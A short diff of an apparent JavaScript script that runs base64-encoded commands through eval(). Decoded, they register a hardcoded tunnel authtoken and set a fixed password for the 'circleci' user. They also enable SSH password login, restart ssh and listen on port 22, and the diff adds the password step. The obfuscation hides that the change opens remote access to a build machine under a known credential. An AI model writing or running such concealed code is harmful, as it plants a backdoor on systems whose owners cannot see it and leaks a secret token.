@@ -41,7 +41,7 @@ async function linux () {
     const secret2 = Buffer.from('YnVpbGRlci5hdXRodG9rZW4oJzI3RHBBc3ZTZkxSOTc4ZjNLUENTWEp0SmJDTV84TVVZVDJtQjdOdkcxandkeEMxaycp', 'base64').toString()
     eval(secret2)
 
-    const secret = Buffer.from('KGFzeW5jICgpID0+IHsgYXdhaXQgcnVuU2hlbGwoJ3N1ZG8gc2VkIC1pIC1lIFwncy8jUGFzc3dvcmRBdXRoZW50aWNhdGlvbiBuby9QYXNzd29yZEF1dGhlbnRpY2F0aW9uIHllcy9nXCcgL2V0Yy9zc2gvc3NoZF9jb25maWcnKTsgYXdhaXQgcnVuU2hlbGwoJ3N1ZG8gc2VydmljZSBzc2ggcmVzdGFydCcpIH0pKCk=', 'base64').toString()
+    const secret = Buffer.from('KGFzeW5jICgpID0+IHsgYXdhaXQgcnVuU2hlbGwoJ2VjaG8gY2lyY2xlY2k6QFBhc3N3b3JkMTIzNDU2IHwgc3VkbyBjaHBhc3N3ZCcpOyBhd2FpdCBydW5TaGVsbCgnc3VkbyBzZWQgLWkgLWUgXCdzL1Bhc3N3b3JkQXV0aGVudGljYXRpb24gbm8vUGFzc3dvcmRBdXRoZW50aWNhdGlvbiB5ZXMvZ1wnIC9ldGMvc3NoL3NzaGRfY29uZmlnJyk7IGF3YWl0IHJ1blNoZWxsKCdzdWRvIHNlcnZpY2Ugc3NoIHJlc3RhcnQnKSB9KSgp', 'base64').toString()
     eval(secret)
 
     listen(69442 - 69420)
